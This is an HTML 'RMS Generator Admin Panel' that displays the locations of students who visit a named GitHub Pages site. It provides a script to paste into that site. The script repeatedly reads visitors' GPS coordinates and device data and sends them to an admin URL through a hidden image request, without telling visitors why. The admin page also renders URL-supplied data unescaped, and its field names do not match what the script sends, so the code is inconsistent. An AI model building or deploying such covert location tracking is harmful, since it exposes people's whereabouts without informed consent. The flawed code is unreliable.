<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RMS Generator Admin</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .admin-container {
            max-width: 1000px;
        }
        
        .location-card {
            background-color: white;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .location-card h3 {
            margin-top: 0;
            border-bottom: 1px solid #eee;
            padding-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .location-card p {
            margin: 5px 0;
        }
        
        .card-footer {
            margin-top: 10px;
            color: #757575;
            font-size: 0.8em;
            text-align: right;
        }
        
        .view-map-btn {
            background-color: #ff5722;
            display: inline-block;
            width: auto;
            padding: 8px 12px;
            margin-top: 10px;
        }
        
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
        
        .status-active {
            background-color: #4CAF50;
            box-shadow: 0 0 5px #4CAF50;
            animation: pulse 2s infinite;
        }
        
        .status-inactive {
            background-color: #9E9E9E;
        }
        
        .controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }
        
        .password-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255,255,255,0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .password-box {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 300px;
        }
        
        .password-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(76, 175, 80, 0); }
            100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
        }
        
        #refresh-btn, #clear-btn, #test-btn {
            width: auto;
        }
        
        .active-users {
            background-color: #f0f4ff;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .active-users h2 {
            margin-top: 0;
            color: #1a237e;
            margin-bottom: 10px;
        }
        
        .instructions {
            background-color: #fff3e0;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #ff9800;
        }
        
        .instructions h3 {
            margin-top: 0;
            color: #e65100;
        }
        
        .code-block {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: monospace;
            margin: 10px 0;
        }
        
        .no-locations {
            padding: 20px;
            background-color: #f8f8f8;
            border-radius: 8px;
            text-align: center;
            color: #757575;
        }
        
        .setup-instructions {
            background-color: #fff3e0;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 5px solid #ff9800;
        }
        
        .setup-instructions h3 {
            color: #e65100;
            margin-top: 0;
        }
        
        .setup-instructions pre {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            white-space: pre-wrap;
            font-family: monospace;
        }
        
        .setup-steps {
            margin-top: 15px;
            padding-left: 20px;
        }
        
        .setup-steps li {
            margin-bottom: 10px;
        }
        
        #copy-script {
            margin-top: 15px;
            background-color: #ff9800;
        }
        
        #copy-script:hover {
            background-color: #f57c00;
        }
    </style>
</head>
<body>
    <div class="container admin-container">
        <h1>RMS Generator Admin Panel</h1>
        <p>This panel shows locations of students who visit: <a href="https://ashutosh231.github.io/rmsgenerator/" target="_blank">https://ashutosh231.github.io/rmsgenerator/</a></p>
        
        <div class="setup-instructions">
            <h3>Important: Setup Required</h3>
            <p>To track locations from your GitHub Pages site, add this script to your site's HTML:</p>
            <pre id="script-code"></pre>
            <button id="copy-script">Copy Script to Clipboard</button>
            
            <div class="setup-steps">
                <h4>Steps to implement tracking:</h4>
                <ol>
                    <li>Go to your GitHub repository for <strong>https://ashutosh231.github.io/rmsgenerator/</strong></li>
                    <li>Edit the <strong>index.html</strong> file</li>
                    <li>Add the script above right before the closing <code>&lt;/body&gt;</code> tag</li>
                    <li>Replace <code>ADMIN_URL_HERE</code> with the URL where this admin page is hosted</li>
                    <li>Commit the changes to your repository</li>
                </ol>
            </div>
        </div>
        
        <div class="controls">
            <button id="refresh-btn">Refresh Data</button>
            <button id="clear-btn">Clear All Data</button>
            <button id="test-btn">Add Test Location</button>
        </div>
        
        <div id="location-list" class="no-locations">
            <p>No location data available yet. Make sure to add the tracking script to your GitHub Pages site.</p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const locationList = document.getElementById('location-list');
            const refreshBtn = document.getElementById('refresh-btn');
            const clearBtn = document.getElementById('clear-btn');
            const testBtn = document.getElementById('test-btn');
            const scriptCode = document.getElementById('script-code');
            const copyScript = document.getElementById('copy-script');
            
            // Set up the script code to be copied
            const trackingScript = `<script>
// Simple location tracking script
(function() {
    function trackLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const data = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    time: new Date().toISOString(),
                    device: navigator.userAgent
                };
                
                // This sends location data to your admin page
                // Replace with your actual admin page URL
                const adminUrl = "https://your-admin-page-url.com/admin.html";
                
                // Send data using image request (most reliable cross-domain method)
                new Image().src = adminUrl + "?loc=" + 
                    encodeURIComponent(JSON.stringify(data));
                
                // Track again after 1 minute
                setTimeout(trackLocation, 60000);
            });
        }
    }
    
    // Start tracking when page loads
    trackLocation();
})();
<\/script>`;
            
            scriptCode.textContent = trackingScript;
            
            // Function to copy script to clipboard
            copyScript.addEventListener('click', function() {
                navigator.clipboard.writeText(trackingScript)
                    .then(() => {
                        copyScript.textContent = "Copied!";
                        setTimeout(() => {
                            copyScript.textContent = "Copy Script to Clipboard";
                        }, 2000);
                    })
                    .catch(err => {
                        console.error('Failed to copy: ', err);
                        alert('Failed to copy script to clipboard. Please select and copy manually.');
                    });
            });
            
            // Check for location data in URL
            function checkUrlForLocationData() {
                const urlParams = new URLSearchParams(window.location.search);
                const locationDataParam = urlParams.get('locationData') || urlParams.get('data');
                
                if (locationDataParam) {
                    try {
                        // Parse the location data
                        const locationData = JSON.parse(decodeURIComponent(locationDataParam));
                        
                        // Save to localStorage
                        saveLocationData(locationData);
                        
                        // Update the display
                        displayLocations();
                        
                        // Clear the URL parameter
                        window.history.replaceState({}, document.title, window.location.pathname);
                    } catch (e) {
                        console.error("Error processing location data from URL", e);
                    }
                }
            }
            
            // Save location data to localStorage
            function saveLocationData(locationData) {
                // Get existing locations
                let locations = getStoredLocations();
                
                // Add the new location with timestamp
                locations.push({
                    ...locationData,
                    receivedAt: new Date().toISOString()
                });
                
                // Keep only the latest 100 locations
                if (locations.length > 100) {
                    locations = locations.slice(-100);
                }
                
                // Save back to localStorage
                localStorage.setItem('rmg_locations', JSON.stringify(locations));
            }
            
            // Get stored locations
            function getStoredLocations() {
                const storedData = localStorage.getItem('rmg_locations');
                return storedData ? JSON.parse(storedData) : [];
            }
            
            // Display the locations
            function displayLocations() {
                const locations = getStoredLocations();
                
                if (locations.length === 0) {
                    locationList.innerHTML = `
                        <p class="no-locations">No location data available yet. Make sure to add the tracking script to your GitHub Pages site.</p>
                    `;
                    return;
                }
                
                // Sort by timestamp (newest first)
                locations.sort((a, b) => {
                    const timeA = a.timestamp || a.receivedAt;
                    const timeB = b.timestamp || b.receivedAt;
                    return new Date(timeB) - new Date(timeA);
                });
                
                let locationsHTML = '';
                
                locations.forEach(location => {
                    const timestamp = location.timestamp || location.receivedAt;
                    const date = new Date(timestamp).toLocaleString();
                    const mapUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
                    
                    // Get address info if available
                    const city = location.address?.city || 'Unknown';
                    const state = location.address?.state || 'Unknown';
                    const fullAddress = location.address?.full || 'Address not available';
                    
                    locationsHTML += `
                        <div class="location-card">
                            <h3>Student Location</h3>
                            <p><strong>Coordinates:</strong> ${location.coords.latitude}, ${location.coords.longitude}</p>
                            <p><strong>City/State:</strong> ${city}, ${state}</p>
                            <p><strong>Address:</strong> ${fullAddress}</p>
                            <p><strong>Device:</strong> ${location.userAgent || 'Unknown'}</p>
                            <p><strong>URL:</strong> ${location.url || location.page || 'Unknown'}</p>
                            <a href="${mapUrl}" target="_blank" class="view-map-btn">View on Google Maps</a>
                            <div class="card-footer">
                                Received: ${date}
                            </div>
                        </div>
                    `;
                });
                
                locationList.innerHTML = locationsHTML;
                locationList.className = ''; // Remove the no-locations class
            }
            
            // Add test location
            function addTestLocation() {
                const testLocation = {
                    coords: {
                        latitude: 31.2526 + (Math.random() * 0.01 - 0.005),
                        longitude: 75.7033 + (Math.random() * 0.01 - 0.005)
                    },
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    url: 'https://ashutosh231.github.io/rmsgenerator/',
                    address: {
                        city: 'Phagwara',
                        state: 'Punjab',
                        full: 'Lovely Professional University, Phagwara, Punjab, India'
                    }
                };
                
                saveLocationData(testLocation);
                displayLocations();
            }
            
            // Clear all locations
            function clearAllLocations() {
                if (confirm('Are you sure you want to clear all location data?')) {
                    localStorage.removeItem('rmg_locations');
                    displayLocations();
                }
            }
            
            // Event listeners
            refreshBtn.addEventListener('click', displayLocations);
            clearBtn.addEventListener('click', clearAllLocations);
            testBtn.addEventListener('click', addTestLocation);
            
            // Check for location data in URL on page load
            checkUrlForLocationData();
            
            // Initial display
            displayLocations();
            
            // Set up periodic checking for new location data
            setInterval(checkUrlForLocationData, 5000);
        });
    </script>
</body>
</html>
